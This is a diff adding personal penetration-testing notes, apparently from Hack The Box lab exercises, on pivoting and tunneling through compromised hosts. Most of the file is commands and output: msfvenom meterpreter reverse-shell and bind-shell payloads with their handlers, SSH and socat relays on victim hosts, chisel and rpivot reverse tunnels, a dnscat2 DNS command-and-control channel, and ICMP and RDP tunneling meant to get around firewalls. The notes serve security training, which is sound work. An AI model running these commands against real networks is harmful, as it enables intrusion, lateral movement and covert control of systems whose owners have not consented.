@@ -1,0 +1,393 @@
+﻿Port Forwarding
+SSH
+ssh -L 1234:localhost:3306 ubuntu@10.129.202.64
+
+forward localhost port 1234 to localhost:3306 on ubuntu server side.
+forward multiple hosts:
+ssh -L 1234:localhost:3306 -L 8080:localhost:80 user@host
+
+Dynamic port forwarding
+ssh -D 9050 ubuntu@10.129.202.64
+Anything sent to port 9050 on my side is sent to the whole internal network on the target side.
+tell proxychains it can use this port:
+tail -4 /etc/proxychains.conf
+
+socks4 127.0.0.1 9050
+
+use nmap with proxychains:
+drime@htb[/htb]$ proxychains nmap -v -sn 172.16.5.1-200
+
+use proxychains + metasploit:
+drime@htb[/htb]$ proxychains msfconsole
+
+proxychains rdp:
+drime@htb[/htb]$ proxychains xfreerdp /v:host /u:user /p:pass
+
+
+Remote Port Forwarding:
+ssh -R <Internal IP ofPivotHost>:8080:0.0.0.0:8000 ubuntu@<ipAddressofTarget> -vN
+
+on the target host, send all incoming messages going to the internal ip of the target host to my side (0.0.0.0:8080). This is for reverse shells through the pivot host.
+Now, I set up the reverse shell to point to the target I have ssh to, and that will forward it to me(0.0.0.0:8080)
+Meterpreter
+set up the shell:
+https://www.revshells.com/
+msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.10.14.38 -f elf -o backupjob LPORT=8080
+msf6 > use exploit/multi/handler
+msf6 exploit(multi/handler) > set payload linux/x64/meterpreter/reverse_tcp
+payload => linux/x64/meterpreter/reverse_tcp
+msf6 exploit(multi/handler) > options
+
+Payload options (windows/x64/meterpreter/reverse_tcp):
+
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
+   LHOST     10.10.14.26      yes       The listen address (an interface may be specified)
+   LPORT     9001             yes       The listen port
+
+
+Ping sweep on internal network
+use ping sweep to see all hosts on the internal network:
+meterpreter > run post/multi/gather/ping_sweep RHOSTS=172.16.5.0/23
+
+[*] Performing ping sweep for IP range 172.16.5.0/23
+
+ping sweep with bash regularly:
+for i in {1..254} ;do (ping -c 1 192.168.56.$i | grep "bytes from" &) ;done
+
+using cmd:
+for /L %i in (1 1 254) do ping 172.16.6.%i -n 1 -w 100 | find "Reply"
+
+powershell:
+1..254 | % {"172.16.6.$($_): $(Test-Connection -count 1 -comp 172.16.6.$($_) -quiet)"}
+
+
+Configure proxy
+in the msfconsole:
+msf6 > use auxiliary/server/socks_proxy
+
+msf6 auxiliary(server/socks_proxy) > set SRVPORT 9050
+SRVPORT => 9050
+msf6 auxiliary(server/socks_proxy) > set SRVHOST 0.0.0.0
+SRVHOST => 0.0.0.0
+msf6 auxiliary(server/socks_proxy) > set version 4a
+version => 4a
+msf6 auxiliary(server/socks_proxy) > run
+[*] Auxiliary module running as background job 0.
+
+[*] Starting the SOCKS proxy server
+msf6 auxiliary(server/socks_proxy) > options
+
+starts a listener on port 9050.
+Tell module to route everything through the meterpreter session from metasploit console:
+msf6 > use post/multi/manage/autoroute
+
+msf6 post(multi/manage/autoroute) > set SESSION 1
+SESSION => 1
+msf6 post(multi/manage/autoroute) > set SUBNET 172.16.5.0
+SUBNET => 172.16.5.0
+msf6 post(multi/manage/autoroute) > run
+
+[!] SESSION may not be compatible with this module:
+[!]  * incompatible session platform: linux
+[*] Running module against 10.129.202.64
+[*] Searching for subnets to autoroute.
+[+] Route added to subnet 10.129.0.0/255.255.0.0 from host's routing table.
+[+] Route added to subnet 172.16.5.0/255.255.254.0 from host's routing table.
+[*] Post module execution completed
+
+other way is to directly add routes from the meterpreter session:
+meterpreter > run autoroute -s 172.16.5.0/23
+
+[!] Meterpreter scripts are deprecated. Try post/multi/manage/autoroute.
+[!] Example: run post/multi/manage/autoroute OPTION=value [...]
+[*] Adding a route to 172.16.5.0/255.255.254.0...
+[+] Added route to 172.16.5.0/255.255.254.0 via 10.129.202.64
+[*] Use the -p option to list all active routes
+
+list active routes:
+meterpreter > run autoroute -p
+
+[!] Meterpreter scripts are deprecated. Try post/multi/manage/autoroute.
+[!] Example: run post/multi/manage/autoroute OPTION=value [...]
+
+Active Routing Table
+====================
+
+   Subnet             Netmask            Gateway
+   ------             -------            -------
+   10.129.0.0         255.255.0.0        Session 1
+   172.16.4.0         255.255.254.0      Session 1
+   172.16.5.0         255.255.254.0      Session 1
+
+now you can use proxychains:
+proxychains nmap 172.16.5.19 -p3389 -sT -v -Pn
+
+connecting with rdp(make sure xquartz is up):
+proxychains4 -f proxychains.conf xfreerdp /v:172.16.5.35 /u:user '/p:pass!'
+
+Meterpreter port forwarding
+create tcp relay:
+meterpreter > portfwd add -l 3300 -p 3389 -r 172.16.5.19
+
+[*] Local TCP relay created: :3300 <-> 172.16.5.19:3389
+
+3300 my side maps to 172.16.5.19:3389
+reverse port forwarding:
+meterpreter > portfwd add -R -l 8081 -p 1234 -L 10.10.14.18
+
+[*] Local TCP relay created: 10.10.14.18:8081 <-> :1234
+
+anything that goes to 10.10.14.18:8081 will be sent to port 1234 on my side. Useful for reverse shells.
+
+
+Socat
+
+
+
+socat
+Using socat
+socat can create pipe sockets between 2 independent network channels.
+ubuntu@Webserver:~$ socat TCP4-LISTEN:8080,fork TCP4:10.10.14.18:80
+
+
+listen on port 8080, forward all traffic to 10.10.14.18:80. Can set this up on the victim server as an alternative to port forwarding with ssh.
+bind shell listener:
+ubuntu@Webserver:~$ socat TCP4-LISTEN:8080,fork TCP4:172.16.5.19:8443
+
+
+listens on port 8080 and forwards to 172.16.5.19:8443
+set up bind shell:
+drime@htb[/htb]$ msfvenom -p windows/x64/meterpreter/bind_tcp -f exe -o backupjob.exe LPORT=8443
+msf6 > use exploit/multi/handler
+
+[*] Using configured payload generic/shell_reverse_tcp
+msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/bind_tcp
+payload => windows/x64/meterpreter/bind_tcp
+msf6 exploit(multi/handler) > set RHOST 10.129.202.64
+RHOST => 10.129.202.64
+msf6 exploit(multi/handler) > set LPORT 8080
+LPORT => 8080
+msf6 exploit(multi/handler) > run
+
+[*] Started bind TCP handler against 10.129.202.64:8080
+
+The bind shell established a connection from our side with the victim doing the listening.
+
+Other pivot methods
+Going around obstacles
+SSH for windows: plink.exe
+Plink, short for PuTTY Link, is a Windows command-line SSH tool that comes as a part of the PuTTY package when installed.
+using plink for ssh:
+plink -ssh -D 9050 ubuntu@10.129.15.50
+
+can use https://www.proxifier.com/
+for creating the proxy setup on a windows side.
+SSHUTTLE
+https://github.com/sshuttle/sshuttle
+removes the need to set up proxychains.
+only works for pivoting over ssh.
+running it:
+drime@htb[/htb]$ sudo sshuttle -r ubuntu@10.129.202.64 172.16.5.0/23 -v 
+
+
+creates entries in iptables, setting up all the forwarding.
+routing traffic:
+drime@htb[/htb]$ nmap -v -sV -p3389 172.16.5.19 -A -Pn
+
+
+Web Server pivoting with RPivot
+https://github.com/klsecservices/rpivot
+run server on attack host:
+drime@htb[/htb]$ python2.7 server.py --proxy-port 9050 --server-port 9999 --server-ip 0.0.0.0
+
+
+client on victim host:
+ubuntu@WEB01:~/rpivot$ python2.7 client.py --server-ip 10.10.14.18 --server-port 9999
+
+Backconnecting to server 10.10.14.18 port 9999
+
+go to target server:
+proxychains firefox-esr 172.16.5.135:80
+
+
+connect using http proxy + ntlm auth:
+python client.py --server-ip <IPaddressofTargetWebServer> --server-port 8080 --ntlm-proxy-ip <IPaddressofProxy> --ntlm-proxy-port 8081 --domain <nameofWindowsDomain> --username <username> --password <password>
+
+
+Port forwarding using windows netsh
+Netsh is a Windows command-line tool that can help with the network configuration of a particular Windows system. Here are just some of the networking related tasks we can use Netsh for:
+Finding routes
+Viewing the firewall configuration
+Adding proxies
+Creating port forwarding rules
+port forward with netsh:
+C:\\Windows\\system32> netsh.exe interface portproxy add v4tov4 listenport=8080 listenaddress=10.129.15.150 connectport=3389 connectaddress=172.16.5.25
+
+verify port forward:
+C:\\Windows\\system32> netsh.exe interface portproxy show v4tov4
+
+Listen on ipv4:             Connect to ipv4:
+
+Address         Port        Address         Port
+--------------- ----------  --------------- ----------
+10.129.15.150   8080        172.16.5.25     3389
+
+so now anything that goes to 10.129.15.150:8080 is routed to 172.16.5.25:3389
+
+Tunneling
+Tunneling
+tunneling routes network traffic through some protocol to hide stuff.
+DNSCAT
+https://github.com/iagox86/dnscat2
+Uses DNS to send data between hosts, with an encrypted C2 channel. sends data inside the TXT records.
+making server:
+drime@htb[/htb]$ sudo ruby dnscat2.rb --dns host=10.10.14.18,port=53,domain=inlanefreight.local --no-cache
+
+
+once you start server, you get a secret key to give the client.
+on victim’s side, use https://github.com/lukebaggett/dnscat2-powershell
+PS C:\\htb> Import-Module .\\dnscat2.ps1
+PS C:\\htb> Start-Dnscat2 -DNSserver 10.10.14.18 -Domain inlanefreight.local -PreSharedSecret 0ec04a91cd1e963f8c03ca499d589d21 -Exec cmd 
+
+
+Chisel
+https://github.com/jpillora/chisel
+tccp/udp based tunneling tool secured by ssh.
+run chisel server on pivot host:
+ubuntu@WEB01:~$ ./chisel server -v -p 1234 --socks5
+
+2022/05/05 18:16:25 server: Fingerprint Viry7WRyvJIOPveDzSI2piuIvtu9QehWw9TzA3zspac=
+2022/05/05 18:16:25 server: Listening on <http://0.0.0.0:1234>
+
+connect to chisel server from attack host:
+drime@htb[/htb]$ ./chisel client -v 10.129.202.64:1234 socks
+
+2022/05/05 14:21:18 client: Connecting to ws://10.129.202.64:1234
+2022/05/05 14:21:18 client: tun: proxy#127.0.0.1:1080=>socks: Listening
+2022/05/05 14:21:18 client: tun: Bound proxies
+2022/05/05 14:21:19 client: Handshaking...
+2022/05/05 14:21:19 client: Sending config
+2022/05/05 14:21:19 client: Connected (Latency 120.170822ms)
+2022/05/05 14:21:19 client: tun: SSH connected
+
+add proxychains config to use port 1080
+drime@htb[/htb]$ tail -f /etc/proxychains.conf 
+
+#
+#       proxy types: http, socks4, socks5
+#        ( auth types supported: "basic"-http  "user/pass"-socks )
+#
+[ProxyList]
+# add proxy here ...
+# meanwile
+# defaults set to "tor"
+# socks4 127.0.0.1 9050
+socks5 127.0.0.1 1080
+
+Reverse Pivot:
+In case firewall rules block inbound, we can get a reverse tunnel, where the pivot host is the client, and the attacker is the server.
+start server on attack host:
+sudo ./chisel server --reverse -v -p 1234 --socks5
+
+2022/05/30 10:19:16 server: Reverse tunnelling enabled
+2022/05/30 10:19:16 server: Fingerprint n6UFN6zV4F+MLB8WV3x25557w/gHqMRggEnn15q9xIk=
+2022/05/30 10:19:16 server: Listening on <http://0.0.0.0:1234>
+
+run client on pivot victim:
+ubuntu@WEB01$ ./chisel client -v 10.10.14.17:1234 R:socks
+
+2022/05/30 14:19:29 client: Connecting to ws://10.10.14.17:1234
+2022/05/30 14:19:29 client: Handshaking...
+2022/05/30 14:19:30 client: Sending config
+2022/05/30 14:19:30 client: Connected (Latency 117.204196ms)
+2022/05/30 14:19:30 client: tun: SSH connected
+
+ICMP Tunneling
+https://github.com/utoni/ptunnel-ng
+pings must be allowed in the firewall.
+Basic port forwarding
+running server on target host:
+ubuntu@WEB01:~/ptunnel-ng/src$ sudo ./ptunnel-ng -r10.129.202.64 -R22
+
+[sudo] password for ubuntu: 
+./ptunnel-ng: /lib/x86_64-linux-gnu/libselinux.so.1: no version information available (required by ./ptunnel-ng)
+[inf]: Starting ptunnel-ng 1.42.
+[inf]: (c) 2004-2011 Daniel Stoedle, <daniels@cs.uit.no>
+[inf]: (c) 2017-2019 Toni Uhlig,     <matzeton@googlemail.com>
+[inf]: Security features by Sebastien Raveau, <sebastien.raveau@epita.fr>
+[inf]: Forwarding incoming ping packets over TCP.
+[inf]: Ping proxy is listening in privileged mode.
+[inf]: Dropping privileges now.
+
+connecting with attack host:
+drime@htb[/htb]$ sudo ./ptunnel-ng -p10.129.202.64 -l2222 -r10.129.202.64 -R22
+
+[inf]: Starting ptunnel-ng 1.42.
+[inf]: (c) 2004-2011 Daniel Stoedle, <daniels@cs.uit.no>
+[inf]: (c) 2017-2019 Toni Uhlig,     <matzeton@googlemail.com>
+[inf]: Security features by Sebastien Raveau, <sebastien.raveau@epita.fr>
+[inf]: Relaying packets from incoming TCP streams.
+
+now local port 2222 will go to the victim side port 22
+Dynamic Port forwarding
+set up with ssh, ssh through the tunnel:
+drime@htb[/htb]$ ssh -D 9050 -p2222 -lubuntu 127.0.0.1
+
+ubuntu@127.0.0.1's password: 
+Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-91-generic x86_64)
+<snip>
+
+proxy with icmp tunnel:
+drime@htb[/htb]$ proxychains nmap -sV -sT 172.16.5.19 -p3389
+
+ProxyChains-3.1 (<http://proxychains.sf.net>)
+Starting Nmap 7.92 ( <https://nmap.org> ) at 2022-05-11 11:10 EDT
+|S-chain|-<>-127.0.0.1:9050-<><>-172.16.5.19:80-<><>-OK
+|S-chain|-<>-127.0.0.1:9050-<><>-172.16.5.19:3389-<><>-OK
+|S-chain|-<>-127.0.0.1:9050-<><>-172.16.5.19:3389-<><>-OK
+Nmap scan report for 172.16.5.19
+Host is up (0.12s latency).
+
+PORT     STATE SERVICE       VERSION
+3389/tcp open  ms-wbt-server Microsoft Terminal Services
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Service detection performed. Please report any incorrect results at <https://nmap.org/submit/> .
+Nmap done: 1 IP address (1 host up) scanned in 8.78 seconds
+
+now everything will go through icmp only, bypassing firewalls.
+RDP and SOCKS Tunneling with SocksOverRDP
+tunneling using windows only.
+https://github.com/nccgroup/SocksOverRDP
+tunnels packets over RDP.
+https://www.proxifier.com/
+proxy server
+loading socksoverrdp:
+C:\\Users\\htb-student\\Desktop\\SocksOverRDP-x64> regsvr32.exe SocksOverRDP-Plugin.dll
+
+go to pivot host and start socksoverrdp with admin privileges.
+verify socks listener started:
+C:\\Users\\htb-student\\Desktop\\SocksOverRDP-x64> netstat -antb | findstr 1080
+
+  TCP    127.0.0.1:1080         0.0.0.0:0              LISTENING
+
+After starting our listener, we can transfer Proxifier portable to the Windows 10 target (on the 10.129.x.x network), and configure it to forward all our packets to 127.0.0.1:1080. Proxifier will route traffic through the given host and port. See the clip below for a quick walkthrough of configuring Proxifier.
+
+Ligolo
+Ligolo
+Create the tunnel named ligolo with your username on your computer
+sudo ip tuntap add user [your_username] mode tun ligolo
+Bring the tunnel up
+sudo ip link set ligolo up
+Start the proxy without a cert
+sudo ./proxy -selfcert
+On the agent computer, connect to your proxy server
+./agent -connect [ip address]:11601 -ignore-cert
+Use session to select the agent
+session , then select 1
+On the agent, start the tunnel on the proxy 
+tunnel_start --tun ligolo
+Add the route on your proxy server
+sudo ip route add [ip address, 192.168.X.X]/24 dev ligolo
